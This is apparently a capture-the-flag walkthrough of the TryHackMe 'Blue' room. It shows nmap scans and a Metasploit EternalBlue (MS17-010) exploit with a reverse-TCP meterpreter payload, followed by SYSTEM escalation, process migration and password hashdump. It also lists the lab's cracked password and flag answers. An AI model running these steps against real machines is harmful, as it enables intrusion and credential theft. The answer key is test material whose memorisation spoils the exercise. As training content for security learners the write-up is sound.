# Blue THM Room 
## Scanning
```
nmap -sC -sV -oN nmapInitial target-ip
```

```python
Starting Nmap 7.60 ( https://nmap.org ) at 2023-12-07 14:19 GMT
Nmap scan report for ip-10-10-120-17.eu-west-1.compute.internal (target-ip)
Host is up (0.00036s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2023-12-06T14:18:24
|_Not valid after:  2024-06-06T14:18:24
|_ssl-date: 2023-12-07T14:21:38+00:00; -1s from scanner time.
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
49160/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 02:18:61:15:2F:BF (Unknown)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:18:61:15:2f:bf (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-12-07T08:21:38-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-12-07 14:21:38
|_  start_date: 2023-12-07 14:18:22

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.81 seconds
```

```
nmap --script vuln -sV -oN nmapVulnScan target-ip
```
***Note: I ran this vulnerability scan based on the prompts given by the THM room.***

```python
Starting Nmap 7.60 ( https://nmap.org ) at 2023-12-07 14:39 GMT
Nmap scan report for ip-10-10-120-17.eu-west-1.compute.internal (target-ip)
Host is up (0.00030s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_sslv2-drown: 
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
49160/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 02:18:61:15:2F:BF (Unknown)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 175.20 seconds
```

## Enumeration
- For the sake of this room, we are going to leverage [Metasploit](https://www.metasploit.com/) for enumeration. There are a multitude of ways to poke and prod at vulnerable SMB shares, but we are going to keep it simple. Let's begin by starting [Metasploit](https://www.metasploit.com/) by using the `msfconsole` command in our terminal. When we do, we get the following:
```rb
______________________________________________________________________________
|                                                                              |
|                          3Kom SuperHack II Logon                             |
|______________________________________________________________________________|
|                                                                              |
|                                                                              |
|                                                                              |
|                 User Name:          [   security    ]                        |
|                                                                              |
|                 Password:           [               ]                        |
|                                                                              |
|                                                                              |
|                                                                              |
|                                   [ OK ]                                     |
|______________________________________________________________________________|
|                                                                              |
|                                                       https://metasploit.com |
|______________________________________________________________________________|


       =[ metasploit v6.3.5-dev-                          ]
+ -- --=[ 2294 exploits - 1201 auxiliary - 410 post       ]
+ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Search can apply complex filters such as 
search cve:2009 type:exploit, see all the filters 
with help search
Metasploit Documentation: https://docs.metasploit.com/

msf6 > 
```

- We can use the [Metasploit](https://www.metasploit.com/) framework search function to find modules related to SMB scanning with the following syntax:
```
msf6 > search smb
msf6 > search Microsoft smb
msf6 > search smb enumeration
```
***Note: This will return several results, so narrowing down what you are looking for is recommended.***

- We can try to do some further enumeration with the following syntax:
```
use auxiliary/scanner/smb/smb_lookupsid
set rhosts target-ip
run
```

- In truth, this isn't strictly necessary. This is primarily designed to get you to interact with [Metasploit](https://www.metasploit.com/) and get comfortable with its syntax and mechanics. There is a lot more this framework can do, and it is absolutely worth further exploration. Let's move on. 

## System Hacking
- Based on the guided questions in this room, we know that we have to start [Metasploit](https://www.metasploit.com/) and leverage the ms-17-010 EternalBlue exploit to get remote access to the machine. We can search for this exploit module using the following syntax:
```
search ms17-010
```

- The output will look something like this:
```rb
Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```

- Let's select the first entry by entering `use 0` into the console. 
- Now that the module is loaded, we can take a look at the options we need to set by using the `show options` command. Here is the output:
```rb
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://d
                                             ocs.metasploit.com/docs/using-met
                                             asploit/basics/using-metasploit.h
                                             tml
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to
                                             use for authentication. Only affe
                                             cts Windows Server 2008 R2, Windo
                                             ws 7, Windows Embedded Standard 7
                                              target machines.
   SMBPass                         no        (Optional) The password for the s
                                             pecified username
   SMBUser                         no        (Optional) The username to authen
                                             ticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matc
                                             hes exploit Target. Only affects
                                             Windows Server 2008 R2, Windows 7
                                             , Windows Embedded Standard 7 tar
                                             get machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploi
                                             t Target. Only affects Windows Se
                                             rver 2008 R2, Windows 7, Windows
                                             Embedded Standard 7 target machin
                                             es.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thr
                                        ead, process, none)
   LHOST     attacking-ip     yes       The listen address (an interface may b
                                        e specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.
```

- Notice the options that have the `Required` field set to `yes`. This means we have to fill in those values for the exploit to be successful. This is pretty simple, and we can set the options by using `set [option] [value]`. For example, we will have to do the following to effectively configure our exploit:
```
msf6 > set RHOSTS target-ip
msf6 > set LHOSTS attcking-ip
```

- With our configurations finished, we can go ahead and run the exploit by using either the `run` command, or the `exploit` command. When we do, we can see the following:

```rb
[*] Started reverse TCP handler on attacking-ip:4444 
[*] target-ip:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] target-ip:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] target-ip:445      - Scanned 1 of 1 hosts (100% complete)
[+] target-ip:445 - The target is vulnerable.
[*] target-ip:445 - Connecting to target for exploitation.
[+] target-ip:445 - Connection established for exploitation.
[+] target-ip:445 - Target OS selected valid for OS indicated by SMB reply
[*] target-ip:445 - CORE raw buffer dump (42 bytes)
[*] target-ip:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] target-ip:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] target-ip:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] target-ip:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] target-ip:445 - Trying exploit with 12 Groom Allocations.
[*] target-ip:445 - Sending all but last fragment of exploit packet
[*] target-ip:445 - Starting non-paged pool grooming
[+] target-ip:445 - Sending SMBv2 buffers
[+] target-ip:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] target-ip:445 - Sending final SMBv2 buffers.
[*] target-ip:445 - Sending last fragment of exploit packet!
[*] target-ip:445 - Receiving response from exploit packet
[+] target-ip:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] target-ip:445 - Sending egg to corrupted connection.
[*] target-ip:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to target-ip
[*] Meterpreter session 1 opened (attacking-ip:4444 -> target-ip:49229) at 2023-12-07 15:10:54 +0000
[+] target-ip:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] target-ip:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] target-ip:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > 
```

- If we end up with a meterpreter shell, we know our exploit was successful. We now have remote access onto the target machine and can look around and escalate privileges at our leisure.

## Privilege Escalation
- Now that we have access, let's load a post-exploitation module that will give us some additional functionality to fully pwn this machine. First, we should background our session with `ctrl+z`. Now, we can enter the following into our console:
```
msf6 > use post/multi/manage/shell_to_meterpreter
```

- When we look at the options with the `show options` command, we can see that we need to supply a `SESSION` number: 
```rb
Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to recei
                                       ve the connection
   LHOST                     no        IP of host that will receive the connec
                                       tion from the payload (Will try to auto
                                        detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.
```

- As before, all we have to do is enter `set SESSION 1` (provided your meterpreter session is 1).
- Now, we can enter `run` to run the module. If everything goes well, we should see the following:
```rb
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on attacking-ip:4433 
[*] Post module execution completed
```

- Now, we have hop back into our meterpreter session by using the `sessions 1` command. 
- To verify that our privilege escalation worked, we can use `getsystem` and see what it says:
```
meterpreter > getsystem
[-] Already running as SYSTEM
```

- As we can see, we are running as system. From here, we can beep bop and boop around and find the flags. This is the end of the walkthrough for compromising the host, but I would highly recommend playing around with [Metasploit](https://www.metasploit.com/) and getting a feel for the commands, how to navigate in the console, and how to leverage meterpreter. I have a full video walkthrough [here](https://www.youtube.com/watch?v=_g5WFt1DYMU&t=2073s)

## THM Questions
### Recon
1. Scan the machine.
2. How many ports are open with a port number under 1000?
	1. 3
3. What is the machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
	1. ms17-010

### Gain Access
1. Start [Metasploit](https://www.metasploit.com/).
2.   Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
	1. `exploit/windows/smb/ms17_010_eternalblue`
3. Show options and set the one required value. What is the name of this value? (All caps for submission).
	1. RHOSTS

- Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:
```
set payload windows/x64/shell/reverse_tcp
```

4. With that done, run the exploit.
5.  Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.

### Escalate
1.  If you haven't already, background the previously gained shell (`CTRL + Z`). Research online how to convert a shell to meterpreter shell in [Metasploit](https://www.metasploit.com/). What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 
	1. `post/multi/manage/shell_to_meterpreter`
2.  Select this (use MODULE_PATH). Show options, what option are we required to change?
	1. SESSION
3.  Set the required option, you may need to list all of the sessions to find your target here.
4. Run! If this doesn't work, try completing the exploit from the previous task once more. 
5. Once the meterpreter shell conversion completes, select that session for use.
6. Verify that we have escalated to `NT AUTHORITY\SYSTEM`. Run `getsystem` to confirm this. Feel free to open a dos shell via the command 'shell' and run `whoami`. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.
7. List all of the processes running via the `ps` command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at `NT AUTHORITY\SYSTEM` and write down the process id (far left column).
8. Migrate to this process using the `migrate PROCESS_ID` command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. 

### Cracking
1. Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?
	1. Jon
2. Copy this password hash to a file and research how to crack it. What is the cracked password?
	1. alqfna22

### Find Flags
1. Flag1? _This flag can be found at the system root._
	1. `flag{access_the_machine}`
2.  Flag2? _This flag can be found at the location where passwords are stored within Windows. Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen._
	1. `flag{sam_database_elevated_access}`
3.  Flag3? _This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved._
	1. `flag{admin_documents_can_be_valuable}`
